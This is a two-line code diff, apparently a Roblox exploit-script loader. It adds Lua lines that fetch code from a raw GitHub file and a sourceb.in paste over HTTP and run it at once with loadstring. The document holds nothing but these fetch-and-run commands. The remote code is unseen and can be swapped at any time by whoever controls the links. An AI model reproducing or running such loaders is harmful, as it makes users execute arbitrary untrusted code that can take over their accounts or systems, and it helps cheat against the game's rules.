@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ranchudaz/gag-script/refs/heads/main/message.txt", true))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FpnlHNbQXd/0", true))()
